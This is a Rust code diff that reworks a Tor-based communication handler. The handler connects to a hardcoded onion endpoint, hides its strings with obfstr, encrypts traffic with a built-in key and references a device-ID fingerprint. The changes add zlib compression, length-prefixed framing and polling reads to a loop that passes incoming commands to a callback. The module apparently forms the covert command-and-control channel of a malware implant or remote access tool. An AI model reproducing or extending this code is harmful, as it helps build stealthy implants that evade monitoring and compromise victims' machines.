@@ -1,4 +1,13 @@
-use std::{ collections::VecDeque, future::Future, path::PathBuf, sync::Arc, time::Duration };
+use std::{
+    collections::VecDeque,
+    future::Future,
+    io::Cursor,
+    path::PathBuf,
+    sync::Arc,
+    time::Duration,
+};
+use byteorder::{ ByteOrder, LittleEndian };
+
 use anyhow::{ Context, Result };
 use arti_client::{ DataStream, StreamPrefs, TorClient, TorClientConfig };
 use obfstr::obfstr as s;
@@ -8,12 +17,20 @@ use crate::{
     ref_tag,
     utils::{ encryption::sauron_encrypt, functions::fetch_constant_device_id },
 };
+use flate2::read::ZlibDecoder;
+use flate2::write::ZlibEncoder;
+use flate2::Compression;
+use std::io::{ Read, Write, BufReader, BufWriter };
 use crate::{
     constants::{ communication_encryption_key, onion_endpoint },
     logs::logger::Logger,
     utils::encryption::{ convert_key_to_bytes, sauron_decrypt },
 };
-use tokio::{ io::{ AsyncReadExt, AsyncWriteExt }, sync::{ Mutex, RwLock }, time::interval };
+use tokio::{
+    io::{ AsyncReadExt, AsyncWriteExt },
+    sync::{ Mutex, RwLock },
+    time::{ interval, timeout },
+};
 use serde::{ Deserialize, Serialize };
 use crate::ref_log_internal;
 
@@ -88,9 +105,12 @@ impl TrHandler {
     pub async fn connect_to_endpoint(&mut self) -> Result<()> {
         let tor_client = self.tr_clnt.lock().await;
         let stream_prefs = self.stream_prefs.read().await;
-        let stream = tor_client
+        let mut stream = tor_client
             .connect_with_prefs((onion_endpoint(), 80), &stream_prefs).await
             .context(s!("Failed to connect to onion endpoint").to_string())?;
+        println!("waiting for connection ( AFTER ENDPOINT OK)");
+        stream.wait_for_connection().await?;
+
         let mut stream_guard = self.stream.lock().await;
         *stream_guard = Some(stream);
 
@@ -126,15 +146,19 @@ impl TrHandler {
             match self.connect_to_endpoint().await {
                 Ok(()) => {
                     // should send connect callback
+                    ref_info!(
+                        self.logger.lock().await.as_ref().expect("no logger"),
+                        "connect_callback calling"
+                    );
                     connect_callback(parent_self_ref.clone());
                     ref_info!(
                         self.logger.lock().await.as_ref().expect("no logger"),
-                        " connect_callback.clone()(); DONE"
+                        " connect_callback() DONE"
                     );
 
                     loop {
                         if
-                            let Err(_error) = self.handle_receive(
+                            let Err(_error) = self.poll_receive(
                                 parent_self_ref.clone(),
                                 receive_callback.clone()
                             ).await
@@ -175,7 +199,7 @@ impl TrHandler {
             ).await;
         }
     }
-    async fn handle_receive<RC, CT>(
+    async fn poll_receive<RC, CT>(
         &self,
         parent_self_ref: Arc<RwLock<CT>>,
         callback: RC
@@ -183,12 +207,23 @@ impl TrHandler {
         where RC: Fn(Arc<RwLock<CT>>, Vec<u8>) + Send + Sync + Clone + 'static
     {
         loop {
-            let data = self
-                .read_data().await
-                .context(s!("Failed to read_data from stream").to_string())?;
+            let data = match self.read_data().await {
+                Ok(data) => data,
+                Err(error) => {
+                    eprintln!("read_data error: {}", error);
+                    if error.to_string().contains("Stream is closed") {
+                        self.get_stream().await?.lock().await.as_mut().unwrap().shutdown().await?;
+                        return Ok(());
+                    }
+                    continue;
+                }
+            };
 
             let parent_clone = parent_self_ref.clone();
-
+            ref_info!(
+                self.logger.lock().await.as_ref().expect("no logger"),
+                "running data callback"
+            );
             callback(parent_clone.clone(), data);
 
             tokio::time::sleep(
@@ -198,27 +233,67 @@ impl TrHandler {
     }
 
     async fn read_data(&self) -> Result<Vec<u8>> {
-        let read_stream_ref = self.get_stream().await?;
+        let stream_ref = self.get_stream().await?;
 
-        let mut shell_guard = read_stream_ref.lock().await;
-        let stream = shell_guard.as_mut().unwrap();
+        // it will wait indef until receives something, holding the lock - so we check the queue periodically and if theres something in the queue - we timeout read length
+        // because it should be instant - we timeout 100ms and if nothing comes we unlock the stream it should be transferred to queue
 
-        stream.wait_for_connection().await?;
+        let data_length: u32;
+        loop {
+            let mut shell_guard = stream_ref.lock().await;
+            let stream = shell_guard.as_mut().unwrap();
 
-        let data_length = match stream.read_u32_le().await {
-            Ok(length) => length,
-            Err(_error) => {
-                // means not our protocol message
-                // assume its conn close
-                return Err(anyhow::anyhow!(s!("?Connection closed by server?").to_owned()));
+            // in here we timeout read u32le, honestly just timeout 50ms and loop, enough time for other thread to lock for writing?
+            let mut buf = [0; 4];
+            match timeout(Duration::from_millis(50), stream.read_exact(&mut buf)).await {
+                Ok(result) => {
+                    data_length = match result {
+                        Ok(_) => { LittleEndian::read_u32(&buf) }
+                        Err(error) => {
+                            if error.kind() == std::io::ErrorKind::UnexpectedEof {
+                                // Stream is closed
+                                return Err(anyhow::anyhow!(s!("Stream is closed").to_owned()));
+                            } else {
+                                return Err(
+                                    anyhow::anyhow!(
+                                        format!("{}{}", s!("Error trying to read: "), error)
+                                    )
+                                );
+                            }
+                        }
+                    };
+                    // break loop when we read the data
+                    break;
+                }
+                Err(error) => {
+                    // println!("timeout elapsed: {}", error);
+                    //? in here we should check if the queue has something only then unlock and sleep
+                    drop(shell_guard);
+                    tokio::time::sleep(Duration::from_millis(20)).await;
+                }
             }
-        };
+        }
+        ref_info!(
+            self.logger.lock().await.as_ref().expect("no logger"),
+            "data_length: ",
+            data_length
+        );
 
         let mut data_buf = vec![0; data_length as usize];
+
+        let mut shell_guard = stream_ref.lock().await;
+        let stream = shell_guard.as_mut().unwrap();
+        // if we received data length we will lock indef until we read that length - so if theres errors GG
+
         stream
             .read_exact(&mut data_buf).await
             .context(s!("Failed to read exact data from stream").to_string())?;
-        Ok(data_buf)
+
+        let mut decoder = ZlibDecoder::new(Cursor::new(data_buf));
+        let mut decompressed = Vec::new();
+        decoder.read_to_end(&mut decompressed).unwrap();
+
+        Ok(decompressed)
     }
 
     async fn send_queue_task(&self) -> ! {
@@ -234,8 +309,7 @@ impl TrHandler {
                     "QUEUE RECEIVED SENDING"
                 );
 
-                if let Err(error) = self.encrypt_and_send(&data).await {
-                    // ref_err!(self.logger.lock().unwrap(), "Failed to encrypt_and_send");
+                if let Err(error) = self.encrypt_compress_and_send(&data).await {
                     ref_err!(
                         self.logger.lock().await.as_ref().expect("no logger"),
                         "Failed to encrypt_and_send: ",
@@ -261,19 +335,35 @@ impl TrHandler {
         );
         Ok(())
     }
-    async fn encrypt_and_send(&self, data: &[u8]) -> Result<()> {
+    async fn encrypt_compress_and_send(&self, data: &[u8]) -> Result<()> {
         let encrypted_data = sauron_encrypt(
             convert_key_to_bytes(&communication_encryption_key()),
             data
         )?;
-        self.send_data(&encrypted_data).await
+
+        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::new(5));
+        encoder.write_all(&encrypted_data).unwrap();
+
+        let compressed = encoder.finish().unwrap();
+        println!("encrypted and compressed data len: {}", compressed.len());
+        self.send_data(&compressed).await
     }
     async fn send_data(&self, data: &[u8]) -> Result<()> {
         let read_stream_ref = self.get_stream().await?;
+
         let mut shell_guard = read_stream_ref.lock().await;
+        println!("send_data got stream unlocked");
+
         let stream = shell_guard.as_mut().unwrap();
-        stream.write_all(data).await.context(s!("Failed to write to stream").to_string())?;
+        stream
+            .write_all(&(data.len() as u32).to_le_bytes()).await
+            .context(s!("Failed to write length of data to stream").to_string())?;
+        stream
+            .write_all(&data).await
+            .context(s!("Failed to write the data to stream").to_string())?;
         stream.flush().await.context(s!("Failed to flush stream").to_string())?;
+        println!("flushed");
+
         Ok(())
     }
     async fn get_stream(&self) -> Result<MutexPtr<Option<DataStream>>> {
